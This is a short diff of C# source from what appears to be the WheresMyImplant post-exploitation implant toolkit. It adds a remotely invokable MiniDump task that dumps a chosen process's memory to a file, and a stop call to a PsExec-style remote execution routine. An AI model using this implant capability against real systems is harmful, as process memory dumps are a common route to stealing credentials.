@@ -507,6 +507,22 @@ namespace WheresMyImplant
             return output.ToString();
         }
 
+        [ManagementTask]
+        public static String MiniDump(String processId, String fileName)
+        {
+            StringBuilder output = new StringBuilder();
+            Int32 pid;
+            if (!Int32.TryParse(processId, out pid))
+            {
+                return output.ToString();
+            }
+
+            MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
+            miniDump.CreateMiniDump((UInt32)pid, fileName);
+            output.Append(miniDump.GetOutput());
+            return output.ToString();
+        }
+
         //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
@@ -564,6 +580,7 @@ namespace WheresMyImplant
                 psexec.Create(command);
                 psexec.Open();
                 psexec.Start();
+                psexec.Stop();
             }
         }
 
